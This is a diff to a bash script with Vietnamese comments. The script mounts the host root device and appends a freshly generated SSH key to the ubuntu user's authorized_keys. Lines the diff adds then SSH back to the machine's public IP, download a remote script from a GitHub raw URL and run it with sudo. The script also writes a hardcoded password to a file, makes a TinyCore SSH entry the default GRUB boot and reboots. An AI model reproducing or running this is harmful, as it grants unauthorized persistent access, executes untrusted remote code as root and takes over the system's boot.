@@ -1,17 +1,22 @@
 #!/bin/bash
-set -euo pipefail
 
-# === PHẦN 1: Backup và tạo SSH key ===
-echo "[0/6] Preparing system..."
+# === SCRIPT 1 ===
 cp /bin/mount /bin/get
 get /dev/root /tmp
 cd /tmp
 rm -rf dli
 ip=$(curl -s ifconfig.me)
+
 ssh-keygen -t rsa -b 2048 -N "" -f ~/.ssh/sv_rsa
 echo $(cat ~/.ssh/sv_rsa.pub) >> /tmp/home/ubuntu/.ssh/authorized_keys
 
-# === PHẦN 2: Cấu hình TinyCore ===
+ssh -i ~/.ssh/sv_rsa -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null ubuntu@$ip \
+"wget https://raw.githubusercontent.com/kienminhkhai84-max/tmate-test/refs/heads/main/a.sh -O a.sh; sudo bash a.sh"
+
+# Chuyển vào thư mục vừa thao tác
+cd /tmp
+
+# === SCRIPT 2 ===
 TCE_VERSION="14.x"
 ARCH="x86_64"
 TCE_MIRROR="http://tinycorelinux.net"
@@ -45,7 +50,6 @@ gzip -dc "$INITRD_PATH" | cpio -idmv
 
 echo "[4/6] Injecting SSH startup script and BusyBox..."
 mkdir -p "$WORKDIR/srv"
-
 curl ifconfig.me > "$WORKDIR/srv/lab"
 echo /win11/T4@123456 >> "$WORKDIR/srv/lab"
 
@@ -96,11 +100,11 @@ menuentry "🔧 TinyCore SSH Auto" {
 EOF
 fi
 
-# Set as default boot
 sed -i 's/^GRUB_DEFAULT=.*/GRUB_DEFAULT="🔧 TinyCore SSH Auto"/' "$GRUB_CFG" || echo 'GRUB_DEFAULT="🔧 TinyCore SSH Auto"' >> "$GRUB_CFG"
 sed -i 's/^GRUB_TIMEOUT=.*/GRUB_TIMEOUT=1/' "$GRUB_CFG" || echo 'GRUB_TIMEOUT=1' >> "$GRUB_CFG"
 
 update-grub
 
-echo -e "\n✅ DONE! System will reboot now."
+# === REBOOT CUỐI CÙNG ===
+echo -e "\n✅ All done! Rebooting now..."
 reboot
